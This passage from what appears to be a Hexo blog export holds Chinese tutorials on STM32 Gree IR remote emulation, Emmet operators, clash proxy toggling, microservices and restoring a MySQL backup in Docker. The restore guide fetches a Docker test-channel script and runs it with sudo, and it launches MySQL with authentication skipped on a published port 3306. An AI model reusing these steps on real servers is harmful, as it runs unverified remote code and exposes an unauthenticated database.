class="string">&quot;第%d个数据:%d\n&quot;</span>, i + <span class="number">1</span>, times_low[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;高电平时间\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">69</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;第%d个数据:%d\n&quot;</span>, i + <span class="number">1</span>, times_high[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一部分我做了debug和输出，将我获得到的空调红外信号输出出来，好让自己进行模拟。</p>
<h3 id="发射模块"><a href="#发射模块" class="headerlink" title="发射模块"></a>发射模块</h3><p><strong>初始化部分</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">//**硬件初始化</span></span><br><span class="line">    RCC-&gt;APB2ENR |= <span class="number">1</span> &lt;&lt; <span class="number">4</span>; <span class="comment">// 使能PORTC时钟</span></span><br><span class="line"></span><br><span class="line">    GPIOC-&gt;CRH &amp;= <span class="number">0xFFF0FFFF</span>;</span><br><span class="line">    GPIOC-&gt;CRH |= <span class="number">0x00030000</span>; <span class="comment">// PC.12推挽输出</span></span><br><span class="line">    GPIOC-&gt;ODR |= <span class="number">0x00001000</span>; <span class="comment">// PC.12输出高  	//端口输出高？</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一部分很好理解，只是把对应的红外发射端口初始化了而已。<br><strong>发送高低电位</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Send_H_delay</span><span class="params">(<span class="type">int</span> time)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; time; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		IR_SEND = <span class="number">1</span>;</span><br><span class="line">		delay_us(<span class="number">13</span>);</span><br><span class="line">		IR_SEND = <span class="number">0</span>;</span><br><span class="line">		delay_us(<span class="number">13</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Send_L_delay</span><span class="params">(<span class="type">int</span> time)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; time; i++)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		IR_SEND = <span class="number">0</span>;</span><br><span class="line">		delay_us(<span class="number">26</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的延时就是考虑了38khz的频率，在38khz的频率下，每26μs就会产生一次电平变化，因此我只要发射高电平的时候每13μs交替一次即可。然后这里的time就是作为次数，用次数*26&#x3D;持续的时间。<br><strong>发送数据</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="type">void</span> <span class="title function_">TR_SendData</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">	<span class="comment">// 引导码</span></span><br><span class="line">	Send_H_delay(<span class="number">338</span>);</span><br><span class="line"></span><br><span class="line">	Send_L_delay(<span class="number">170</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 数据</span></span><br><span class="line">	<span class="keyword">for</span> (t = <span class="number">0</span>; t &lt; <span class="number">35</span>; t++)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		Send_H_delay(<span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (data[t])</span><br><span class="line">		&#123;</span><br><span class="line">			Send_L_delay(<span class="number">60</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			Send_L_delay(<span class="number">22</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 连接码</span></span><br><span class="line">	<span class="comment">// 引导码</span></span><br><span class="line">	Send_H_delay(<span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">	Send_L_delay(<span class="number">770</span>);</span><br><span class="line">	<span class="comment">// 第二段数据</span></span><br><span class="line">	<span class="keyword">for</span> (t = <span class="number">0</span>; t &lt; <span class="number">32</span>; t++)</span><br><span class="line">	&#123;</span><br><span class="line">		Send_H_delay(<span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (data[<span class="number">35</span> + t])</span><br><span class="line">		&#123;</span><br><span class="line">			Send_L_delay(<span class="number">60</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			Send_L_delay(<span class="number">22</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 发送结束码</span></span><br><span class="line">	Send_H_delay(<span class="number">22</span>);</span><br><span class="line">	Send_L_delay(<span class="number">22</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一块为什么这么发送就需要看下面的内容了，因为他不是采用标准的NEC格式，而是使用格力空调的自有格式</p>
<h2 id="格力空调编码"><a href="#格力空调编码" class="headerlink" title="格力空调编码"></a>格力空调编码</h2><p>格力空调遥控器（YB0F2）红外码组成如下，按解码顺序排列 </p>
<p>起始码（S）+35位数据码+连接码（C）+32位数据码 </p>
<p>1、各种编码的电平宽度： </p>
<p>数据码由“0”“1”组成： </p>
<p>0的电平宽度为：600us低电平+600us高电平，</p>
<p>1的电平宽度为：600us低电平+1600us高电平</p>
<p>起始码S电平宽度为：9000us低电平+4500us高电平</p>
<p>连接码C电平宽度为：600us低电平+20000us高电平</p>
<p> 2、数据码的形成机制 </p>
<p>前35位数据码形成如下图所示：<br><img src="https://image.zfxt.top/hexo-blog/%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%A8%A1%E6%8B%9F%E6%A0%BC%E5%8A%9B%E7%A9%BA%E8%B0%83%E9%81%A5%E6%8E%A7%E5%99%A8-2024-05-21-21-06-13.png" alt="嵌入式模拟格力空调遥控器-2024-05-21-21-06-13"></p>
<p>后32位数据码形成如下图所示：</p>
<p><img src="https://image.zfxt.top/hexo-blog/%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%A8%A1%E6%8B%9F%E6%A0%BC%E5%8A%9B%E7%A9%BA%E8%B0%83%E9%81%A5%E6%8E%A7%E5%99%A8-2024-05-21-21-07-12.png" alt="嵌入式模拟格力空调遥控器-2024-05-21-21-07-12"></p>
<p><img src="https://image.zfxt.top/hexo-blog/%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%A8%A1%E6%8B%9F%E6%A0%BC%E5%8A%9B%E7%A9%BA%E8%B0%83%E9%81%A5%E6%8E%A7%E5%99%A8-2024-05-21-21-08-17.png" alt="嵌入式模拟格力空调遥控器-2024-05-21-21-08-17"><br>上表中，大于两位的数据都是逆序递增的，各数据的意义如下：</p>
<p>校验码形成：</p>
<p>校验码 &#x3D; (模式 – 1) + (温度– 16) + 5  + 左右扫风 + 换气 + 节能 - 开关<br>之后取二进制后四位，再逆序；</p>
<p><strong>以上</strong><br>知道这些功能后就基本可以实现对格力空调的遥控功能。下面附上我的代码。<br><a href="https://zfxt.top/ZOS.7z">下载链接</a></p>
]]></content>
      <tags>
        <tag>-嵌入式</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌套、属性、乘法、编号、文本操作符</title>
    <url>/posts/b520c1d4/</url>
    <content><![CDATA[<h1 id="嵌套操作符"><a href="#嵌套操作符" class="headerlink" title="嵌套操作符"></a>嵌套操作符</h1><blockquote>
<p>引用自<a href="https://zhuanlan.zhihu.com/p/217864875">知乎</a><br><strong>&gt; (子元素)</strong><br><code>div&gt;ul&gt;li</code><br>表现为：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>+ （兄弟元素）</strong><br><code>div+p+bq</code><br>表现为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>^ 返回上层</strong></p>
<ul>
<li>使用 ^ 运算符，您可以爬上树的一个层次，并更改上下文<br><code>div+div&gt;p&gt;span+em^bq</code><br>表现为：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">// 此时的上下文返回到两个div所在的这一层了</span><br></pre></td></tr></table></figure></li>
<li>当然了，^ 也可以多个并用，有几个 ^ 就返回几层<br><code>div+div&gt;p&gt;span+em^^bq</code><br>表现为：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line">// 此时上下文已经返回到最外层了</span><br></pre></td></tr></table></figure>
** * 乘法**<br>使用 * 操作符，您可以定义应该输出多少次该元素，跟我们加减乘除里的乘法含义相近</li>
</ul>
<p><code>ul&gt;li*5</code></p>
<p>表现为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="属性操作符-Attribute-operators"><a href="#属性操作符-Attribute-operators" class="headerlink" title="属性操作符(Attribute operators)"></a>属性操作符(Attribute operators)</h1><p><strong>ID 和 Class</strong><br>Emmet使用类似于CSS选择器的语法给元素添加属性</p>
<p><code>div#header+div.page+div#footer.class1.class2.class3</code><br>表现为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;header&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;page&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;class1 class2 class3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>$编号(Item numbering)</strong><br>操作符可以生成重复元素，而 $ 可以去元素进行编号。需要将 $ 放在元素名、属性名或者属性值里</p>
<p><code>ul&gt;li.item$*5</code><br>表现为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item5&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果想实现00x的格式，该怎么办呢？</p>
<p>可以连写多个$就可以生成带有前导的编号了</p>
<p><code>ul&gt;li.item$$$*5</code><br>表现为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item001&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item002&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item003&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item004&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item005&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>Text: {}文本</strong><br>可以使用大括号 {}为元素添加文本，就类似于模板的插入符</p>
<p><code>div&#123;hello world&#125;</code><br>表现为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Emmet</tag>
      </tags>
  </entry>
  <entry>
    <title>快速便捷开关代理模式</title>
    <url>/posts/9f2a8376/</url>
    <content><![CDATA[<h2 id="如何快速开启和关闭代理模式"><a href="#如何快速开启和关闭代理模式" class="headerlink" title="如何快速开启和关闭代理模式"></a>如何快速开启和关闭代理模式</h2><p>这一步的前提是你已经完成了clash的部署内容<a href="https://memos.zfxt.top/m/13">上一篇文章</a><br>当完成了clash的部署后，自然是需要打开代理的<br>简单的方法就是</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890           </span><br><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:7890   </span><br><span class="line"><span class="built_in">export</span> all_proxy=socks5://127.0.0.1:7891</span><br></pre></td></tr></table></figure>
<p>但是这只是临时使用。如果每次开关代理都这般麻烦，倒不如不用<br>也可以直接将这个部署到<code>/etc/profile</code>或者<code>/root/.bashrc</code>中。但他是永久性的改变。于是有些情况，他并不适用。国内的网站访问时，如果打开代理会使访问速度大大降低。得不偿失。</p>
<h4 id="所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。"><a href="#所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。" class="headerlink" title="所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。"></a>所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。</h4><ol>
<li>第一种简洁方式（但是并不太符合所期望的简洁模式）<br> 设计两个sh脚本分别为<code>open.sh</code>和<code>close.sh</code><br> 先在目录下建一个目录<code>switch</code><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> switch &amp;&amp; <span class="built_in">cd</span> switch</span><br></pre></td></tr></table></figure>
然后编写两个文件，并把以下内容填入<br>open.sh<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:7890</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890</span><br><span class="line"><span class="built_in">export</span> all_proxy=socket5://127.0.0.1:7891</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;已经打开代理&quot;</span></span><br></pre></td></tr></table></figure>
close.sh<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">unset</span> http_proxy</span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br><span class="line"><span class="built_in">unset</span> all_proxy</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;已经关闭代理&quot;</span></span><br></pre></td></tr></table></figure>
他们的作用分别使打开代理和关闭代理。</li>
</ol>
<h2 id="普及一个知识点"><a href="#普及一个知识点" class="headerlink" title="普及一个知识点"></a>普及一个知识点</h2><h3 id="source和bash"><a href="#source和bash" class="headerlink" title="source和bash"></a>source和bash</h3><p>他们都可以执行shell脚本，但是bash命令会新建一个sh窗口，然后执行sh命令，而在新命令行中即便使用了export暴露了全局变量，也只是在新命令行以及新命令行建立的子命令行中有效。当他执行完毕后，他就会销毁构建的命令行，回到你的shell连接界面。此时你刚刚export暴露的全局变量都没了。<br>而如果使用source去执行sh命令。他不会构建一个新命令行，而是在当前的命令行下直接执行，所以你export的全局变量就算正确完成了。</p>
<h3 id="Get"><a href="#Get" class="headerlink" title="Get"></a>Get</h3><p>source命令等同于.命令<br>bash命令也可以简化为.&#x2F;命令<br>即</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> open.sh</span><br><span class="line">//等价于</span><br><span class="line">. open.sh</span><br><span class="line">////</span><br><span class="line">./open.sh</span><br><span class="line">//等价于</span><br><span class="line">bash open.sh</span><br></pre></td></tr></table></figure>
<h2 id="然后可以将这两个命令软链接到-usr-bin来达到快捷启动的方法"><a href="#然后可以将这两个命令软链接到-usr-bin来达到快捷启动的方法" class="headerlink" title="然后可以将这两个命令软链接到&#x2F;usr&#x2F;bin来达到快捷启动的方法"></a>然后可以将这两个命令软链接到&#x2F;usr&#x2F;bin来达到快捷启动的方法</h2><p>在<code>/usr/bin</code>下执行以下命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /root/switch/open.sh openProxy</span><br><span class="line"><span class="built_in">ln</span> -s /root/switch/close.sh closeProxy</span><br></pre></td></tr></table></figure>
<p>如上，便可以简单的执行启动和关闭代理的命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@VM-16-15-ubuntu:~/switch# . openProxy</span><br><span class="line">已经打开代理</span><br><span class="line">root@VM-16-15-ubuntu:~/switch# . closeProxy</span><br><span class="line">已经关闭代理</span><br></pre></td></tr></table></figure>
<p>以上就是第一种方法。<br>2. 可以在.bashrc中定义方法，在这其中的方法，也是可以直接访问的，而且他执行完后，他export的内容就会变成全局变量。<br>只需要在.bashrc中加入以下内容即可。<br>具体如下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Open proxy</span></span><br><span class="line"><span class="function"><span class="title">on</span></span>() &#123;</span><br><span class="line">    <span class="built_in">export</span> https_proxy=http://127.0.0.1:7890</span><br><span class="line">    <span class="built_in">export</span> http_proxy=http://127.0.0.1:7890</span><br><span class="line">    <span class="built_in">export</span> all_proxy=socks5://127.0.0.1:7891</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;代理已经打开&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Close proxy</span></span><br><span class="line"><span class="function"><span class="title">off</span></span>() &#123;</span><br><span class="line">    <span class="built_in">unset</span> http_proxy</span><br><span class="line">    <span class="built_in">unset</span> https_proxy</span><br><span class="line">    <span class="built_in">unset</span> all_proxy</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;代理已经关闭&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就可以通过</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">on</span><br><span class="line">off</span><br></pre></td></tr></table></figure>
<p>来启动和关闭代理了</p>
]]></content>
      <categories>
        <category>clash</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>微服务：松耦合，统一整体的架构风格</title>
    <url>/posts/d21e1073/</url>
    <content><![CDATA[<p>（1）微服务就是一种架构风格<br>（2）微服务就是把一个项目拆分成独立的多个服务，并且多个服务是可以独立运行的，而每个服务都会占用线程。</p>
<h1 id="表现为结构上的松耦合，功能上的统一整体"><a href="#表现为结构上的松耦合，功能上的统一整体" class="headerlink" title="表现为结构上的松耦合，功能上的统一整体"></a>表现为结构上的松耦合，功能上的统一整体</h1><p>微服务，关键其实不仅仅是微服务本身，而是系统要提供一套基础的架构，这种架构使得微服务可以独立的部署、运行、升级，不仅如此，这个系统架构还让微服务与微服务之间在结构上“松耦合”，而在功能上则表现为一个统一的整体。这种所谓的“统一的整体”表现出来的是统一风格的界面，统一的权限管理，统一的安全策略，统一的上线过程，统一的日志和审计方法，统一的调度方式，统一的访问入口等等。</p>
]]></content>
      <tags>
        <tag>微服务</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库备份及恢复</title>
    <url>/posts/d635a576/</url>
    <content><![CDATA[<h2 id="常用数据库备份策略"><a href="#常用数据库备份策略" class="headerlink" title="常用数据库备份策略"></a>常用数据库备份策略</h2><ol>
<li><p>mysqldump工具备份（数据量小）<br> <strong>mysqldump</strong>由于是mysql自带的备份工具，所以也是最常用的mysql数据库的备份工具。支持基于InnoDB的热备份。但由于是逻辑备份，所以速度不是很快，适合备份数据量比较小的场景。</p>
<p> mysqldump完全备份+二进制日志 —&gt;实现时间点恢复</p>
</li>
<li><p>基于LVM快照备份（冷备份）</p>
<p> 在物理备份中 ，有基于文件系统的物理备份（LVM的快照），也可以直接用tar之类的命令打包。但这些只能进行冷备份</p>
<p> 不同的存储引擎能备份的级别也不一样，MyISAM能备份到表级别，而InnoDB不开启每表一文件的话就只能备份整个数据库。</p>
</li>
<li><p>使用percona提供的xtrabackup（推荐）</p>
<p> 支持InnoDB的物理热备份，支持完全备份，增量备份，而且速度非常快，而且支持InnoDB引擎的数据在不同数据库迁移。<br> 优点如下：</p>
<ol>
<li><p>无需停止数据库进行InnoDB热备份，在50G以上的数据量备份时候，应该是首选工具。</p>
</li>
<li><p>支持增量备份MySQL并通过流传输到其他的服务器上。</p>
</li>
<li><p>备份MySQL的时候不会增加服务器的负载。</p>
</li>
</ol>
</li>
</ol>
<p>在这里我们不演示如何备份的工作，而只针对于如何将数据恢复到数据库中，并且关闭密码校验。</p>
<h2 id="恢复数据库"><a href="#恢复数据库" class="headerlink" title="恢复数据库"></a>恢复数据库</h2><blockquote>
<p>这里以xtrabackup备份后的数据为例。将从一台全新的ubuntu服务器上完成数据库的恢复</p>
</blockquote>
<p>首先我们会拥有一个<code>backup.tar.gz</code>的一个压缩包。他实际上就是我们数据库的data文件夹。因此我们只需要将这个压缩包解压到对应的data目录下，然后通过修改密码。重新启动这个数据库即可完成数据的再次访问。</p>
<h3 id="第一步-解压备份文件"><a href="#第一步-解压备份文件" class="headerlink" title="第一步:解压备份文件"></a>第一步:解压备份文件</h3><p>首先还是先把我们的数据库文件解压出来<br>我们这里选择在<code>/root/back/102</code>目录下解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf backup.tar.gz -C /root/back/102</span><br></pre></td></tr></table></figure>

<p>表示会把<code>backup.tar.gz</code>解压到<code>/root/back/102</code>目录下</p>
<p>然后我们创建一个<code>data</code>目录,用来把解压后的文件移动到这个目录下.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/back/102 <span class="comment">#移动到指定目录下</span></span><br><span class="line"><span class="built_in">mkdir</span> data <span class="comment"># 创建目录</span></span><br><span class="line"><span class="built_in">mv</span> /root/back/102/tmp/backup/2024-03-23/full/* /root/back/102/data <span class="comment"># 移动文件到指定目录下</span></span><br></pre></td></tr></table></figure>

<p><img src="https://image.zfxt.top/hexo-blog/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%8F%8A%E6%81%A2%E5%A4%8D-2024-05-25-10-53-36.png" alt="数据库备份及恢复-2024-05-25-10-53-36"><br>此时我们可以看到在你对应的目录下,有一个data文件夹,这个文件夹下面就是数据库的所有文件.</p>
<h3 id="第二步：安装mysql服务"><a href="#第二步：安装mysql服务" class="headerlink" title="第二步：安装mysql服务"></a>第二步：安装mysql服务</h3><ol>
<li><p>安装docker<br> 这里我们使用docker来安装mysql服务，这样子可以简化很多环境问题。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://test.docker.com -o test-docker.sh</span><br><span class="line"><span class="built_in">sudo</span> sh test-docker.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过docker拉取mysql镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mysql:8.0.19</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动mysql服务<br>这里要考虑两个情况,一个是我们正常的使用.一个是跳过过校验过程进入安全模式实现对密码的修改.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">docker run -p 3306:3306 --name 102 \</span><br><span class="line">-v /root/back/102/mysql-files:/var/lib/mysql-files \</span><br><span class="line">-v /root/back/102/conf:/etc/mysql \</span><br><span class="line">-v /root/back/102/logs:/var/log/mysql \</span><br><span class="line">-v /root/back/102/data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=yourpassword \</span><br><span class="line">-d mysql:8.0.19 \</span><br><span class="line">--skip-grant-tables <span class="comment"># 跳过密码校验.带上这个参数表示进入安全模式</span></span><br></pre></td></tr></table></figure>

<p> 这里他会把你的数据库文件挂载到<code>/var/lib/mysql</code>目录下.</p>
</li>
</ol>
<h3 id="第三步：修改密码"><a href="#第三步：修改密码" class="headerlink" title="第三步：修改密码"></a>第三步：修改密码</h3><blockquote>
<p>这里我们需要修改密码并允许远程连接</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 102 bash <span class="comment"># 进入docker服务内部</span></span><br><span class="line">mysql -u root -p <span class="comment"># 进入mysql(此时是安全模式,不会有密码校验)</span></span><br></pre></td></tr></table></figure>

<p>进入mysql后我们查看数据后.需要修改密码.</p>
